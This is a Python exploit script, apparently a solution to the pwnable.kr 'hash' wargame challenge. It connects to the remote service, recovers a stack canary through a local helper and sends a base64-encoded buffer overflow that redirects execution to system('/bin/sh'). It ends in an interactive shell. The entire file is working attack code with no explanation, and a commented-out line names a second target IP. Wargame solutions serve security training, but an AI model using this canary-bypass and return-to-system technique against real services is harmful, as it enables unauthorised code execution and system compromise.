from zio import *
from base64 import *
from requests import *
import os
import sys 
import time 


#io = zio('./hash')
io = zio( ('pwnable.kr', 9002) ) 
#io = zio( ('198.96.90.99', 8888) ) 


print io.read_until('captcha :')
captcha = int(io.read_until('\n'))
print 'captcha:',captcha
cookie = os.popen('./calc ' + str(captcha) ).read()
print 'cookie: ',cookie
io.writeline(str(captcha))

main = 0x804908F
system = 0x08048880
sh = 0x804b3b4 
payload = ''
payload = payload.ljust(0x200, 'a')
payload += l32( int(cookie, 16) )
payload += 'a'*0x8
payload += 'a'*0x4
payload += l32( system )
payload += l32( sh )
payload += l32( sh )
payload += l32( sh )
payload += l32( sh )
payload = b64encode( payload )
payload = list( payload )
l = len(payload)
payload[l - 8] = '/'
payload[l - 7] = 'b'
payload[l - 6] = 'i'
payload[l - 5] = 'n'
payload[l - 4] = '/'
payload[l - 3] = 's'
payload[l - 2] = 'h'
payload[l - 1] = '\x00'
payload = ''.join( i for i in payload )
print io.read_until('me!')
io.writeline( payload )

io.interact()

